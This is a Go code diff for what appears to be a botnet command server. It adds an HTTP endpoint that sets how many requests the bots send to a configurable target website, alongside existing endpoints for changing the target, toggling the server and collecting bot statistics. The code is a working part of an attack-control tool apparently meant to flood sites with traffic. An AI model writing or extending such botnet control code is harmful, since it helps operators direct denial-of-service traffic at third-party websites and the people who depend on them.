@@ -39,6 +39,10 @@ type ChangeTargetReqBody struct {
 	Target string `json:"target"`
 }
 
+type SetRequestsNumberReqBody struct {
+	RequestsNumber int `json:"requestsNumber"`
+}
+
 var targetInfo = TargetInfo{"https://theuselessweb.com/", 50}
 var botnetServer = BotnetServer{true, make(map[string]time.Time), []BotStats{}}
 var PORT = 5000
@@ -138,6 +142,25 @@ func GetBotsStats (c *gin.Context) {
 	})
 }
 
+func SetRequestsNumber (c* gin.Context) {
+	var setRequestsNumberReqBody SetRequestsNumberReqBody;
+	err := c.ShouldBindJSON(&setRequestsNumberReqBody)
+
+	if err == nil {
+		targetInfo.RequestNum = setRequestsNumberReqBody.RequestsNumber
+
+		c.JSON(200, gin.H{
+			"message": "Requests number has been set to " + strconv.Itoa(setRequestsNumberReqBody.RequestsNumber),
+		})
+		return
+	} else {
+		c.JSON(500, gin.H{
+			"messsage": "Oops, error while setting requests number", 
+		})
+		return
+	}	
+}
+
 
 func main() {
 	server := gin.Default()
@@ -150,6 +173,7 @@ func main() {
 	server.POST("/sendBotStat", PostSendBotStats)
 	server.POST("/setServerStatus", SetServerStatus)
 	server.POST("/changeTarget", ChangeTarget)
+	server.POST("/setRequestsNumber", SetRequestsNumber)
 
 	server.Run(":" + strconv.Itoa(PORT))
 }
